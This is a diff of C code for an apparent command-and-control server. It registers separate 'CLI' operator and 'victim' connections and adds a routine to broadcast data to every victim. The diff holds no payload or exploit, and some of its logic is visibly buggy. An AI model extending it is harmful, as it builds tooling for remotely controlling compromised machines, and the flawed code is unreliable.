@@ -8,6 +8,8 @@
 
 #include "netwerking.h"
 
+#define CLI_CLIENT 0
+#define VICTIM_CLIENT 1
 #define UNUSED(X) (void)(X);
 
 /* === Tcp Initialization and Handle Functions === */
@@ -42,11 +44,13 @@ void handleCliAccept(struct eventLoop *event_loop, int fd, int mask, void *clien
         struct sockaddr_in address;  
         socklen_t address_len = sizeof(address);
 
-        int clientfd = netAccept(fd, (struct sockaddr*)&address, &address_len);
-        netNonBlock(NULL, clientfd); 
+        int clifd = netAccept(fd, (struct sockaddr*)&address, &address_len);
+        netNonBlock(NULL, clifd); 
         printf("New CLI Client connected\n");
 
-        //connCreateConnection(clientfd);
+        struct connection *conn = connCreateConnection(clifd);
+
+        struct client *cli = createClient(conn, CLI_CLIENT);
 }
 
 void handleVictimAccept(struct eventLoop *event_loop, int fd, int mask, void *clientData){
@@ -63,27 +67,34 @@ void handleVictimAccept(struct eventLoop *event_loop, int fd, int mask, void *cl
 
         struct connection *conn = connCreateConnection(client_fd);
        
-        connSetReadHandler(conn, readDataFromClient); 
-        
-        struct client *victim = createClient(conn);
+
+        struct client *victim = createClient(conn, VICTIM_CLIENT);
 }
 
 /* === Client Handler and Functions  ===  */
-//struct client *createClient(connection *conn){
-struct client *createClient(struct connection *conn){
+struct client *createClient(struct connection *conn, int mask){
         struct client *c = malloc(sizeof(struct client));
         if (c == NULL) return NULL;
         
+        c->conn = malloc(sizeof(*(c->conn)));
         c->cmd = malloc(sizeof(*(c->cmd)));
-        if (c->cmd == NULL) return NULL;
+        if (c->cmd == NULL || c->conn == NULL) return NULL;
 
-        if (conn)
+        if (conn){
                 connSetReadHandler(conn, readDataFromClient);
+                //connSetHandlers(conn, readDataFromClient, sendDataToClient);
+                connSetPrivData(conn, c);
+                //connSetWriteHandler(conn, sendDataToClient);
+        }
 
+        c->conn = conn;
         c->fd = conn->fd;
 
         // Add the new client to the linked list
-        if (conn) linkList(server.victims, c);
+        if (conn && (mask & CLI_CLIENT))
+                linkList(server.cli, c);
+        if (conn && (mask & VICTIM_CLIENT))
+                linkList(server.victims, c);
 
         return c;
 }
@@ -147,18 +158,36 @@ int netAccept(int s, struct sockaddr *sa, socklen_t *len){
 }
 
 void readDataFromClient(struct connection *conn){
+        struct client *c = connGetPrivData(conn);
+        
         char buff[1024];
         memset(buff, 0, sizeof(buff));
         
         int bytes = connRead(conn, buff, 1024);
         printf("Received %d bytes: %s\n", bytes, buff);        
+
+        //struct list *group = server.victims;
+        //sendToGroup(buff, group);
 }
 
-void netWrite(int fd){
+void sendToGroup(char *buff, struct list *group){
+        struct listNode *temp;
+
+        temp = group->head;
+        while (temp != NULL){
+                struct connection *conn = temp->data; 
+                connWrite(conn, buff, 1024);
+                temp = temp->next;
+        }  
+}
+
+void sendDataToClient(struct connection *conn){
         char *motd = "From Server: MOTD\n";
         
-        if (write(fd, motd, strlen(motd)) < 0)
+        if (connWrite(conn, motd, strlen(motd)) < 0)
                 perror("write");
+        
+        printf("Sent data to clients\n");
 }
 
 int netClose(int fd){
